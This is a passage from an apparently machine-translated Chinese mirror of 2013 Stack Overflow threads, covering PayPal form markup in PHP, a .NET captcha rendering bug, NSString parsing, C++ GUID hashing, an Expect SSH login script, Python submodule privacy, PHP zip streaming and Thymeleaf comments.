                              <form action="https://www.paypal.com/cgi-bin/webscr" method="post" id="regularPriceForm"  name="regularPriceForm">
                                <td class="price price-label">
                                        <input type="hidden" name="cmd" value="_xclick">
                                        <input type="hidden" name="business" value="<?php echo @"tamararie@gmail.com" ?>">
                                        <input type="hidden" name="item_name" value="<?php the_title(get_field('cover_image')) ?> ">
                                        <div class="meta-text item-field_price"><?php the_sub_field("regular_price_description"); echo (' : ');  the_sub_field("regular_price"); echo '$' ?></div>
                                        <input type="hidden" name="amount" value="<?php the_sub_field("regular_price"); ?>">
                                        <input type="hidden" name="no_shipping" value="2">
                                        <input type="hidden" name="no_note" value="0">
                                        <input type="hidden" name="currency_code" value="<?php echo 'USD' ?>">
                                        <input type="hidden" name="country" value="<?php echo 'US' ?>">
                                </td>
                                <td class='quantity price-label'>     
                                    qty. <input type="number" name="quantity" value="1" maxlength="9" min="1" max='9'>
                                </td>
                                <td class="submitButtonTd price-label">
                                        <input type="hidden" name="bn" value="PP-BuyNowBF">
                                        <a class='meta-text' href='javaScript:document.regularPriceForm.submit();'>Purchase</a>
                                </td> 
                              </form> 
                            </tr>
                            <!-- END OF table row for price -->

                            <!-- table row for additional price START-->
                            <?php if(get_sub_field('additional_price')):?>
                                <tr>
                                    <form>

                                    <td class="form-description-td">
                                        <form action="https://www.paypal.com/cgi-bin/webscr" method="post" name="secondPriceForm">
                                                <input type="hidden" name="cmd" value="_xclick">
                                                <input type="hidden" name="business" value="<?php echo @"tamararie@gmail.com" ?>">
                                                <input type="hidden" name="item_name" value="<?php the_title(get_field('cover_image')) ?> ">
                                                <div class="meta-text item-field_price"><?php the_sub_field("additional_price_description"); echo (' : '); the_sub_field("additional_price");  echo '$' ?></div>
                                                <input type="hidden" name="amount" value="<?php the_sub_field("additional_price"); ?>">
                                                <input type="hidden" name="no_shipping" value="2">
                                                <input type="hidden" name="no_note" value="0">
                                                <input type="hidden" name="currency_code" value="<?php echo 'USD' ?>">
                                                <input type="hidden" name="country" value="<?php echo 'US' ?>">

                                    </td>
                                    <td class='quantity price-label'>     
                                    qty. <input type="number" name="quantity" value="1" maxlength="9" min="1" max='9'>
                                   </td>
                                    <td class="submitButtonTd">
                                                <input type="hidden" name="bn" value="PP-BuyNowBF">
                                                <a class='meta-text' href='javaScript:document.secondPriceForm.submit();'>Purchase</a>
                                    </td> 
                                    </form> 
                                </tr>
                                <!-- END OF table row for additional price -->
                                <?php endif; ?>

                            <?php endif; ?>
                            <!-- END OF table row for pay_pal_data-->

                            <!-- table row for print_meta START-->
                            <?php elseif(get_row_layout() == "print_meta"): // layout: File ?>

                            <tr>

                                <td class='meta-text'> Size: <?php if(get_sub_field("size")){ the_sub_field("size");} ?></td>
                                <td class='meta-text right-meta-text'><?php  if(get_sub_field("series_size")){ echo 'Limited edition of '; the_sub_field("series_size");} ?> </td>
                            </tr>

                            <!-- END OF table row for print_meta-->

                            <?php endif; ?>

                            </table>

                            <?php endwhile; ?> 
```

这是该页面的链接： [网站页面](http://tamarmesser.com/book/song-of-songs/)

链接是每本书下的 2 个购买链接。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:22:00.080

将`id`第二种形式的 设置为`secondPriceForm`。您目前仅设置`name`.

# c# - .NET System.Drawing Windows Server 2008R2 64bit 与所有其他窗口相比的差异（图像在 2008R2-64 中损坏，但在其他 Windows 中没有）

> ID：15526124
> 
> 赞同：0
> 
> 时间：2013-03-20T14:18:48.033
> 
> 标签：c#, asp.net, .net-3.5, captcha, system.drawing

我得到了一台安装了 Windows Server 2008R2 64bit (x86) 的开发 PC，因此它被用作工作站。我的开发环境是针对 .NET3.5 的 VS2008（是的，**2008**！！！）

在我们的网站（现在已经有几年了）有一个内部开发的验证码。

长话短说，这些*字母*不会在我的开发机器 2008R2-64 上输出，而是在所有其他窗口（我们的测试和实时服务器是 2003 64 位）和 Virtual PC（2008 32 位而不是 R2、XP、Win7）上输出。

我在网上看到一些帖子说像素的测量方式*可能*已经改变（很难确定），但没有太大变化。

这是一个小的网络应用程序来说明这个问题。

```
using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace Captcha1
{
    public partial class _Default : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            Random _randomNumberGenerator = new Random();

            /* Output random string */
            float _xPosition = 20;
            float _xPositionMax = 0;
            float _yPosition = 0;
            float _yPositionMax = 0;
            string strRandom = string.Empty;

            /* Prepare drawing functions to output */
            System.Drawing.Bitmap objBmp = new System.Drawing.Bitmap(500, 200);
            System.Drawing.Graphics objGraphics = System.Drawing.Graphics.FromImage(objBmp);
            objGraphics.Clear(System.Drawing.Color.AliceBlue);
            objGraphics.TextRenderingHint = System.Drawing.Text.TextRenderingHint.AntiAlias;

            string[] strFont = new string[] { "Arial" };
            string[] strArray = new string[] { "a", "b", "c", "d", "e" };
            strRandom = "AAAAAA";//these are the characters for the captcha. In normal circumstances it would be random!

            /* Render the image */
            int _rotate = -1;
            objGraphics.RotateTransform(3);
            foreach (char _char in strRandom.ToCharArray())
            {
                /* Rotate the image */
                objGraphics.RotateTransform((float)(_rotate * 5));
                _rotate = (_rotate == 1) ? -1 : 1;

                /* Generate random y position */
                _yPosition = Convert.ToInt32(_randomNumberGenerator.Next(15, 20));

                /* Select random font */
                System.Drawing.Font objFont = new System.Drawing.Font("Arial", 22, System.Drawing.FontStyle.Bold);

                /* Output the next character */
                objGraphics.DrawString(_char.ToString(), objFont, System.Drawing.Brushes.Black, _xPosition, _yPosition);

                /* Get the width of the string added */
                System.Drawing.SizeF _stringSize = objGraphics.MeasureString(_char.ToString(), objFont);

                /* Dispose of the font */
                objFont.Dispose();

                /* Output the next character */
                objGraphics.DrawImage(objBmp, _xPosition, _yPosition);

                /* Increment x position */
                _xPosition = _xPosition + (_stringSize.Width * (float)0.8);

                /* Get bounding area */
                _xPositionMax = _xPosition;
                _yPositionMax = (int)(_yPosition + _stringSize.Height);
            }
            _xPositionMax += 20;
            _yPositionMax += 15;

            System.Drawing.Bitmap objBmpFinal = new System.Drawing.Bitmap((int)_xPositionMax, (int)_yPositionMax);
            System.Drawing.Graphics objGraphicsFinal = System.Drawing.Graphics.FromImage(objBmpFinal);
            System.Drawing.Rectangle _rectDest = new System.Drawing.Rectangle(0, 0, (int)_xPositionMax, (int)_yPositionMax);
            objGraphicsFinal.DrawImageUnscaledAndClipped(objBmp, _rectDest);

            /* Draw a curve over the image */
            float _yPositionMaxCurve = _yPositionMax - 20;
            System.Drawing.Pen _penCurve = new System.Drawing.Pen(System.Drawing.Color.Black, 2);
            objGraphicsFinal.DrawBezier(_penCurve,
                _randomNumberGenerator.Next(5, 10), _randomNumberGenerator.Next(5, (int)_yPositionMaxCurve),
                _randomNumberGenerator.Next((int)(_xPositionMax / 6), (int)(_xPositionMax / 5)), _randomNumberGenerator.Next((int)(_yPositionMaxCurve / 2), (int)_yPositionMaxCurve),              // y2
                _randomNumberGenerator.Next((int)(_xPositionMax / 4), (int)(_xPositionMax / 3)), _randomNumberGenerator.Next(5, (int)_yPositionMaxCurve),                             // y3
                _randomNumberGenerator.Next((int)(_xPositionMax - 5), (int)_xPositionMax), _randomNumberGenerator.Next(5, (int)_yPositionMaxCurve));                            // y4
            _penCurve.Dispose();

            /* Draw diagonal lines */
            System.Drawing.Pen _penHatch = new System.Drawing.Pen(System.Drawing.Color.Black, 1);
            for (int _i = -100; _i < _xPositionMax; _i += ((int)_xPositionMax / 8))
            {
                float _bottomPos = ((float)Math.Tan((Math.PI * 45 / 180.0)) * _yPositionMax);
                objGraphicsFinal.DrawLine(_penHatch, _i, 0, _bottomPos + _i, _yPositionMax);
            }
            for (int _i = 0; _i < (_xPositionMax + 100); _i += ((int)_xPositionMax / 8))
            {
                float _bottomPos = ((float)Math.Tan((Math.PI * 45 / 180.0)) * _yPositionMax);
                objGraphicsFinal.DrawLine(_penHatch, _i, 0, ((-_bottomPos) + _i), _yPositionMax);
            }
            _penHatch.Dispose();

            /* Draw bounding rectangle */
            System.Drawing.Pen _penBorder = new System.Drawing.Pen(System.Drawing.Color.Black, 1);
            objGraphicsFinal.DrawRectangle(_penBorder, 0, 0, (int)(_xPositionMax - 1), (int)(_yPositionMax - 1));
            _penBorder.Dispose();

            /* Draw random speckles */
            for (int _speckle = 0; _speckle < 100; _speckle++)
            {
                /* Generate a random colour */
                System.Drawing.Color _speckleColor = System.Drawing.Color.FromArgb((byte)_randomNumberGenerator.Next(0, 255), (byte)_randomNumberGenerator.Next(0, 255), (byte)_randomNumberGenerator.Next(0, 255));

                /* Create a brush */
                System.Drawing.SolidBrush _speckleBrush = new System.Drawing.SolidBrush(_speckleColor);

                /* Select random font */
                System.Drawing.Font _speckleFont = new System.Drawing.Font(strFont[_randomNumberGenerator.Next(0, (strFont.Length - 1))], _randomNumberGenerator.Next(2, 6), System.Drawing.FontStyle.Regular);

                /* Get speckle character */
                int i = Convert.ToInt32(_randomNumberGenerator.Next(0, (strArray.Length - 1)));
                string _speckleCharacter = strArray[i].ToString();

                /* Draw speckle */
                objGraphicsFinal.DrawString(_speckleCharacter, _speckleFont, _speckleBrush, _randomNumberGenerator.Next(0, (int)_xPositionMax), _randomNumberGenerator.Next(0, (int)_yPositionMax));

                /* Dispose of objects */
                _speckleBrush.Dispose();
                _speckleFont.Dispose();
            }

            /* Output the image */
            Response.ContentType = "image/GIF";
            objBmpFinal.Save(Response.OutputStream, System.Drawing.Imaging.ImageFormat.Gif);

            objGraphics.Dispose();
            objGraphicsFinal.Dispose();

            objBmpFinal.Dispose();
            objBmp.Dispose();

            /* End the response */
            Response.End();
        }
    }
} 
```

这里有一些图片显示了它*应该*是什么样子以及它在 Win 2008R2 64 上的样子。

它应该看起来如何： ![工作验证码图像](../Images/5b746aa1507866b44577685d0b3981ca.png)

不工作！！！！ ![在此处输入图像描述](../Images/937509a7af99e3380403e198e8a72ace.png)

我刚拿到这台电脑，所以可能有些“角色”没有打开（ASP.NET、.NET3.5、静态内容都打勾）。

有人有什么好主意吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:08:32.860

你需要分而治之。做到这一点的方法是开始消除不影响输出的事物（背景项目）。然后消除随机元素（您可以为您的生成器播种，以便它为您提供相同的结果），或使用常量。当您可以将其归结为“当我输入此行时，我没有文字，但是当我将其取出时，我有文字”，您就找到了原因。

玩转验证码很有趣，但是您这样做的方式使得调试和验证变得非常困难。这种类型的代码应该进行单元测试并使单元可测试，以便给定特定的起始种子，您可以在任何地方获得一致的输出。

在我们的环境中，我们时不时会遇到字体不呈现像素相同的问题，因为一个测试服务器有一个版本的字体而另一个没有。我不认为这是你的问题。

# iphone - 如何从 NSString 解析数字？

> ID：15526127
> 
> 赞同：1
> 
> 时间：2013-03-20T14:18:52.913
> 
> 标签：iphone, objective-c, nsstring

```
NSString *numberVector = @"( 1, 2, 3, 4)"; 
```

我想从这些数字中获取 NSMutableArray。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:33:39.923

这是更简单的一个，先将其转换为 json 字符串，然后转换为数组使用`NSJSONSerialization`

```
NSString *numberVector = @"( 1, 2, 3, 4)";
numberVector = [numberVector stringByReplacingOccurrencesOfString:@"(" withString:@"["];
numberVector = [numberVector stringByReplacingOccurrencesOfString:@")" withString:@"]"];
NSError* error;
NSMutableArray *arr = [NSJSONSerialization JSONObjectWithData:[numberVector dataUsingEncoding:NSUTF8StringEncoding] options:NSJSONReadingMutableContainers error:&error]; 
```

**更新**

这对两者都有效`@"( 1, 2, 3, 4)"`，`@"(\n 1,\n 2,\n 3,\n 4\n)"`因为 json 字符串可以有新行和空格。

**PS**这适用于 iOS 5.0 或更高版本的其他 iOS，您可以使用 SBJSON 或其他可用的解析库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:21:41.527

如果您知道这正是您的格式，并且不必在空格、括号或逗号的数量上保持灵活：

```
NSCharacterSet *trimSet = [NSCharacterSet characterSetWithCharactersInString:@" ()"];
numberVector = [numberVector stringByTrimmingCharactersInSet:trimSet];
NSArray *numbers = [numberVector componentsSeparatedByString:@", "]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:37:25.237

像这样尝试它对于它只接受数字的任何类型的数据都可以正常工作。

```
NSString *numberVector = @"(\n 1,\n 2,\n 3,\n 4\n)";

    NSString *onlyNumbers = [numberVector  stringByReplacingOccurrencesOfString:@"[^0-9,]" withString:@"" options:NSRegularExpressionSearch range:NSMakeRange(0, [numberVector  length])];
    NSArray *numbers=[onlyNumbers componentsSeparatedByString:@","];
    NSLog(@"%@",numbers); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:28:22.740

请参阅下面的代码，它应该可以工作：

```
 NSCharacterSet *cSet = [NSCharacterSet characterSetWithCharactersInString:@" ()"];  
  numberVector = [numberVector stringByTrimmingCharactersInSet:cSet];
  //specify delimiter below
  NSArray *numbers = [numberVector componentsSeparatedByString:@", "]; 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2013-03-20T14:20:30.327

有了这个：

```
NSString *numberVector = @"( 1, 2, 3, 4)"; 
```

编辑

```
NSError *error = NULL;
NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"&([^;])*;" options:NSRegularExpressionCaseInsensitive error:&error];
NSString *modifiedString = [numberVector stringByReplacingMatchesInString:string options:0 range:NSMakeRange(0, [string length]) withTemplate:@""];

NSArray *listItems = [[modifiedString stringByTrimmingCharactersInSet:[NSCharacterSet newlineCharacterSet]] componentsSeparatedByString:@", "] 
```

# c++ - 智能指针和 unordered_map、unordered_set 等

> ID：15526129
> 
> 赞同：2
> 
> 时间：2013-03-20T14:18:57.927
> 
> 标签：c++, hash, map, unordered-map, unordered-set

我需要一个可搜索的 GUID 集合（存储为 16 个字节），其中实际的唯一 ID 是智能指针结构/类的成员。这是引用计数并由其他对象在“最后一个引用删除”的基础上指向 - 类似于`std::shared_ptr`. 但是由于我的智能指针类的自定义性质，我不想使用`shared_ptr`.

但是，我确实想使用类似`std::unordered_map`或`std::unordered_set`（如果它们足够快）来保存指针集合。

即使智能指针地址是唯一的，因此最好用作散列，但我需要表中的可搜索键作为 GUID；这样我就可以用它`find(guid)`来快速定位正确的智能指针。

很难用语言解释，所以这里有一些代码：

```
class SmartPointer
{
public:
   GUID guid;
   int refCount; // Incremented/decremented when things point or stop pointing to it.
   void* actualObject; // The actual data attached to the smart pointer.
};

// Generate a unique 128-bit id.
GUID id;

// Create the smart pointer object.
SmartPointer* sp = new SmartPointer();
sp->guid = id;

// Create a set of SmartPointers.
std::unordered_set<SmartPointer*> set;
set.insert(sp);

// Need to find a SmartPointer based on a known GUID and not the pointer itself.
SmartPointer* found = set.find(id); 
```

我认为这应该可以通过像[这里](https://stackoverflow.com/questions/3332989/using-string-as-a-key-in-an-unordered-set)这样的自定义哈希/相等函数中的一些取消引用来实现，但我不确定具体如何。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T14:29:24.353

使用标准散列容器，您需要一个可散列键（即可以通过散列算法转换为 size_t 的东西）和键的等价运算符，以防散列冲突（即两个 GUID 不同但散列到相同的值）。

为了通过 GUID 查找 SmartPointer，您可能需要 unordered_map 而不是 unordered_set。请参阅底部的示例。

在任何情况下，有两种方法可以散列自定义类：(1) 专门化 std::hash 或 (2) 在散列容器的类型定义中提供散列和可能的相等函子。

### 专门化 std::hash

要为您的智能指针专门化 std::hash 以便它查看 GUID，请执行以下操作：

```
namespace std 
{ 
    template<>
    struct hash< SmartPointer > 
    {
        size_t operator()( const SmartPointer& sp ) const
        {
            return hash( sp.guid );
        }
    };

    template<>
    struct hash< GUID > 
    {
        size_t operator()( const GUID& id ) const
        {
            return /* Some hash algo to convert your GUID into a size_t */;
        }
    };
} 
```

（这两种特化可以根据您的需要进行组合。如果您只使用 GUID 作为散列键，如下面的 unordered_map 示例中所示，那么您不需要 SmartPointer 的特化。如果您只散列 SmartPointer 作为您的键，如当你只使用 std::unordered_set 时，你可以直接在第一个专业化中散列 sp.guid，而不是让它踢到第二个专业化。）

定义了这些特化后，假设您为哈希类型定义了相等比较，它将在标准的基于哈希的容器中自动为您哈希。像这样使用它：`std::unordered_map<GUID, SharedPointer>`或`std::unordered_set<SharedPointer>`。（有关以这种方式进行专业化的更多信息，请参阅[如何为自定义类型扩展 std::tr1::hash？。](https://stackoverflow.com/questions/647967/how-to-extend-stdtr1hash-for-custom-types)）

### 在散列容器类型中使用自定义函子

对于 (2)，您可以更改无序集/映射的类型并提供仿函数作为模板参数：

```
struct HashSmartPointer
{
    std::size_t operator()( const SmartPointer& sp ) const
    {
        return /* Some hash algo to convert your sp.guid into a size_t */;
    }
};

std::unordered_set< SmartPointer, HashSmartPointer > mySet; 
```

再次假设您为 SmartPointer 定义了相等性以处理冲突（否则，将另一个参数添加到 unordered_set 的相等函子的模板参数中）。

### 完整示例

这是一个完整的程序，演示了我认为您所要求的内容：

```
#include <vector>
#include <cstdlib>
#include <cstdint>
#include <algorithm>
#include <cassert>
#include <unordered_map>

class GUID // Some goofy class. Yours is probably better
{
public:
   std::vector<uint8_t> _id;

   GUID()
     : _id(16)
   {
      std::generate(_id.begin(),_id.end(), std::rand);
   }

   friend bool operator ==( const GUID& g1, const GUID& g2 )
   {
      return std::equal( g1._id.begin(), g1._id.end(), g2._id.begin() );
   }

   friend bool operator !=( const GUID& g1, const GUID& g2 )
   {
      return !(g1 == g2);
   }
};

class SmartPointer
{
public:
   GUID guid;
   int refCount; // Incremented/decremented when things point or stop pointing to it.
   void* actualObject; // The actual data attached to the smart pointer.

   friend bool operator ==( const SmartPointer& p1, const SmartPointer& p2 )
   {
      // This may not be right for you, but good enough here
      return p1.guid == p2.guid;
   }
};

struct HashGUID
{
    std::size_t operator()( const GUID& guid ) const
    {
        // Do something better than this. As a starting point, see:
        //   http://en.wikipedia.org/wiki/Hash_function#Hash_function_algorithms
        return std::accumulate( guid._id.begin(), guid._id.end(), std::size_t(0) );
    }
};

int main()
{
   // Create the smart pointer object.
   SmartPointer sp1, sp2, sp3;

   assert( sp1.guid != sp2.guid );
   assert( sp1.guid != sp3.guid );
   assert( sp2.guid != sp3.guid );

   // Create a set of SmartPointers.
   std::unordered_map<GUID, SmartPointer, HashGUID> m;
   m[sp1.guid] = sp1;
   m[sp2.guid] = sp2;
   m[sp3.guid] = sp3;

   const GUID guid1 = sp1.guid;    
   const GUID guid2 = sp2.guid;    
   const GUID guid3 = sp3.guid;    

   // Need to find a SmartPointer based on a known GUID and not the pointer itself.
   auto found1 = m.find( guid1 );
   auto found2 = m.find( guid2 );   
   auto found3 = m.find( guid3 );   

   assert( found1 != m.end() );
   assert( found2 != m.end() );
   assert( found3 != m.end() );

   assert( found1->second == sp1 );
   assert( found2->second == sp2 );
   assert( found3->second == sp3 );
} 
```

### 更新下面的 OP 评论

根据经验，如果您将原始指针存储在标准容器中，您可能做错了。如果您要存储智能指针的原始指针，则更是如此。引用计数指针的要点是所包含的指针（实际对象）不重复，而智能指针设备可以有许多副本浮动，每个副本对应于引用计数的一个增量，并且每个引用相同的包含对象。因此，您通常会看到类似`std::unordered_set< std::shared_ptr<MyClass>, Hasher, Equality >`.

如果您想为 SmartPointer 的所有实例设置一个 GUID，您可能希望 GUID 成为引用计数数据的（秘密）部分：

```
class SmartPointer
{
public:
   int refCount; // Incremented/decremented when things point or stop pointing to it.
   struct
   {
       GUID guid;
       void* actualObject; // The actual data attached to the smart pointer.
   } *refCountedData;
}; 
```

将 SmartPointer 与 std::unordered_set 一起使用，您将只有一份 GUID 副本，但由于所有散列机制都在 std::unordered_set 内部，因此您无权访问散列键。要通过 GUID 在集合中查找它，您需要进行手动搜索，这否定了散列的优势。

为了得到你想要的，我认为你要么需要定义自己的散列容器，让你更好地控制来自外部的散列，要么使用像侵入式引用计数 GUID 对象之类的东西，例如：

```
class GUID
{
public:
    typedef std::vector<std::uint8_t> ID;
    int refCount;
    ID* actualID;
    // ...
};

SmartPointer sp1, sp2;

std::unordered_map< GUID, SmartPointer > m;
m[ sp1.guid ] = sp1;
m[ sp2.guid ] = sp2; 
```

在这种情况下，GUID actualID 只存在一个副本，尽管它是映射的键和映射中值的成员，但它的引用计数装置将存在多个副本。

在 64 位系统上，计数可能是 32 位，指针可能是 64 位，这意味着 GUID 对象的每个副本总共需要 12 个字节，每个实际 GUID 可以节省 4 个字节。使用 32 位计数器和指针，每个 GUID 将节省 8 字节，使用 64 位计数器和指针，它将占用与 GUID 数据相同的空间。前两个中的一个在您的应用程序/平台中可能值得，也可能不值得，但最后一个可能不值得。

如果是我，我只会复制 GUID 对象作为键，直到我知道它基于测量是不可接受的。然后我可以优化 GUID 对象的实现以在不影响用户代码的情况下进行内部引用计数。

# ssh - 期望 - ssh - 两个可能的密码 - 或者如何跳转期望块并仍然使用发送子句

> ID：15526132
> 
> 赞同：0
> 
> 时间：2013-03-20T14:19:00.313
> 
> 标签：ssh, expect, if-statement

首先我需要说我很喜欢使用公钥和私钥，但这并没有解决我的问题。另外我知道我可以使用两个脚本（一个使用密码 1，第二个使用密码 2）并运行它们两次，但我想知道为什么以下操作不起作用。我正在尝试制作将通过 ssh 连接并检查两个密码之一是否正确的期望脚本。为此，我正在检查脚本的退出代码：

*   0 - 密码 1 正确
*   1 - 密码 2 正确
*   2,3,4,5,6 - 其他一些退出代码，受这篇文章的启发：[期望发送奇怪的结构](https://stackoverflow.com/questions/13705020/linux-expect-send-weird-constructions)

远程机器上可能有更多可能的登录提示，我想让这个脚本尽可能通用，所以我不能依赖登录提示字符串。到目前为止，我有这个代码：

```
#!/usr/local/bin/expect
set username "username";
set remote_server "machine";
set password1 "badpassword";
set password2 "goodpassword";

set timeout 5;
set pretype 0;
set retcode 0;

if { $pretype == 0 } {
  spawn ssh -q ${username}@${remote_server}
  expect {
    "no)?"    { send "yes\r"; }
    "denied" {
                puts "Can't login to $remote_server. Check username and password\n";
                set retcode 2;
             }
    "telnet:" {
                puts "Can't connect to $remote_server via SSH or Telnet. Something went definitely wrong\n";
                set retcode 3;
              }
    "failed" {
                puts "Host $remote_server exists. Check ssh_hosts file\n";
                set retcode 4;
             }
    timeout {
                puts "Timeout problem. Host $remote_server doesn't respond\n";
                set retcode 5;
            }
    "refused" {
                puts "Host $remote_server refused to SSH. That is insecure.\n";
                set retcode 6;
                }
    "assword:" {    set pretype 1; send "${password1}\r";  }
  }
} else {
    expect{
        "assword:" {    send "${password2}\r"; exit 1; }
        timeout { exit 0; }
    }
} 
```

这背后的想法如下：如果我输入错误的密码，我将有第二次机会输入正确的密码。因此，如果我第一次输入错误的密码，我的脚本应该在 else 分支中继续（因为 I `set pretype to 1`）。在这里，我将期待再次输入密码的提示。所以我将发送第二个密码并使用代码 1 退出（密码 2 可以）。如果 else 分支中的超时过期（“密码：”字符串不匹配），很可能我已经有登录提示，所以脚本将以代码 0 退出（密码 1 正常）。但这不起作用，如果我在调试器中运行它，我看到的最后一行是：

```
send: sending "badpassword\r\r" to { exp4 } 
```

我不知道为什么会发生这种情况，但似乎脚本永远不会到达 else 分支。非常感谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T01:58:42.897

`set pretype 1`在`if`块中不能让它`else`再次进入块。没有编程语言会这样做。您在这里需要类似*循环*（使用`while`or `exp_continue`）的东西。

下面是一个例子：

```
#!/usr/bin/expect

set passwords { bad1 bad2 bad3 good }

spawn ssh -o PreferredAuthentications=keyboard-interactive \
          -o NumberOfPasswordPrompts=[llength $passwords] root@tree

set try 0
expect {
    "Password: " {
        if { $try >= [llength $passwords] } {
            send_error ">>> wrong passwords\n"
            exit 1
        }

        send [lindex $passwords $try]\r
        incr try
        exp_continue
    }

    "bash-4.2" {
        interact
    }

    timeout {
        send_error ">>> timed out\n"
        exit 1
    }
} 
```

# python - 使用 __all__ 在父模块中公开时，如何防止用户从子模块导入 x

> ID：15526133
> 
> 赞同：6
> 
> 时间：2013-03-20T14:19:02.647
> 
> 标签：python, coding-style

考虑以下场景：

*   您`M`定义了`m.py`一个包含函数的模块`f`。

    可以这样调用：

    ```
    import M;
    M.f() 
    ```

*   该模块增长到一个大小，在单个文件中是不切实际的。您拆分为子`M`模块`M.X`，并将以下内容放入：`M.Y``M.Z``M/__init__.py`

    ```
    from .X import *
    from .Y import *
    from .Z import *

    __all__ = ["f"] 
    ```

    原始代码仍然有效：

    ```
    import M;
    M.f() 
    ```

但是，代码的新使用者可能会错误地直接访问子模块：

```
import M.X;
M.X.f() 
```

我想防止这种情况发生，这样所有代码仍然一致地直接寻址 M，而不是任何子模块。

子模块有利于内部代码组织，并且引用 M 留下了将来容易重组的可能性。

一种选择是命名子模块`_X`, `_Y`, 并`_Z`传达它们是内部的。这是推荐的方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T22:02:16.737

> 一种选择是将子模块命名为 _X、_Y 和 _Z 以表明它们是内部的。这是推荐的方法吗？

由于您不希望人们访问 MX，因此您需要移动 X.py 模块，以便它不再作为 MX 可用。您可以按照 Kaie 的建议将其删除，但是啊。因此，是的，您的建议是推荐的方法。

1.  移至`M/X.py`_`M/_X.py`

2.  在`M/__init__.py`有线`from ._X import f`

正如其他人所建议的那样，人们可以访问代码不应该是一个真正的问题，并且它是一种使用具有更强封装性的语言进行编程的习惯渗透到您的 Python 设计中。

> 子模块有利于内部代码组织，并且引用 M 留下了将来容易重组的可能性。

是的，这是我来自 C 和 C++ 并整天与 ABI 打交道时所担心的问题。但是，如果代码很小并且经过充分测试，这通常不是问题。这是您以后可以轻松解决的问题。如果有一天你决定重新组织代码，`X`那么`_X`我相信 Jenkins 可以告诉你还有什么需要更新的。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:44:37.697

有一种方法，但我认为你不会喜欢它：

```
# M/__init__.py

from .X import *
del X
__all__ = ["x"] 
```

您仍然可以这样做`import M.X`，但在使用时会抛出错误。

# php - 尝试即时创建 zip 文件，但未添加项目

> ID：15526138
> 
> 赞同：0
> 
> 时间：2013-03-20T14:19:14.653
> 
> 标签：php, zip, popen

我正在尝试压缩一些文件并将其发送给用户下载。压缩文件按预期发送，但没有任何文本文件添加到存档中。

谁能看到我做错了什么？我尝试过相对和绝对文件路径。

另外，作为第二个问题：如果此代码正确，我的开发环境是 WAMP 设置，而我的实时环境是 LAMP 设置 - 此代码是否适用于两者？

```
header('Content-Type: application/zip'); 
header('Content-Disposition: attachment; filename="download1.zip"');
header('Content-Transfer-Encoding: binary');
ob_clean();
flush();
$fp = popen('zip -0 -j -q -r - C:\xampp\htdocs\test\f\1.txt C:\xampp\htdocs\test\f\2.txt', 'r');
while (!feof($fp)) {
echo fread($fp, 8192);
ob_flush();
flush();
}
pclose($fp); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:39:58.790

zip 命令中的第一个文件名是要创建的 zip 文件的名称，以下文件是您要添加到实现的文件。似乎只是在伪造的 zip 文件中捏造就可以了：

$fp = popen('zip -0 -j -q -r - download1.zip test.txt test2.txt', 'r');

# thymeleaf - 如何在未包含在生成的 HTML 中的 Thymeleaf 模板中添加源代码注释？

> ID：15526140
> 
> 赞同：52
> 
> 时间：2013-03-20T14:19:19.930
> 
> 标签：thymeleaf

我在中型 Web 应用程序中使用全栈 Thymeleaf（spring mvc、security、layout dialect、webflow）。

好的..现在我们在 html 模板中放置了这么多代码，最好包含未包含在生成的 HTML 文件中的源代码注释。

我们如何做到这一点？

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2013-11-06T21:58:21.800

版本 2.1 已发布，因此现在您可以升级库并在代码中使用注释。使用此版本，开发人员可以使用解析器级别的注释块：

```
<!--/* This code will be removed at thymeleaf parsing time! */--> 
```

和仅原型的注释块：

```
<span>hello!</span>
<!--/*/
    <div th:text="${...}">

</div>
/*/-->
<span>goodbye!</span> 
```

详细解释可以看这里的官方文档：[http ://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#comments-and-blocks](http://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#comments-and-blocks)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2015-10-31T17:43:35.913

如前所述[Rafal Borowiec](https://stackoverflow.com/users/718515/rafal-borowiec)评论您应该使用的 HTML 代码块

`<!--/*`评论`*/-->`建设的东西（见[文档](http://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#thymeleaf-parser-level-comment-blocks)）。

也可以使用 thymeleaf 注释/删除您的 javascript 代码

`/*[-`评论`-]*/`建设的东西（见[文档](http://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#removing-code)）。所以你可以在不泄露任何信息的情况下注释你的 js 代码

```
/*[-
 *
 * Some information about function.
 *
 * -]*/
function someFunction() {
    console.log('Hello world');
} 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2019-07-03T11:11:28.113

对于 Thymeleaf 3.0，当前工作的版本是

```
<!--/*-->
   this comment will be removed by thymeleaf on the template processing
<!--*/--> 
```

对于早期的百里香叶版本，其他答案对我不起作用。当前的 thymeleaf 文档在[这里](https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#comments-and-blocks)。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-06-23T12:15:17.520

在 2.1 版之前，您可以执行此操作

```
<th:block th:if="${false}"><!--   ignore me  --></th:block> 
```

它非常丑陋（`th:block`需要一个 false `th:if`）但有效。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-28T00:10:49.420

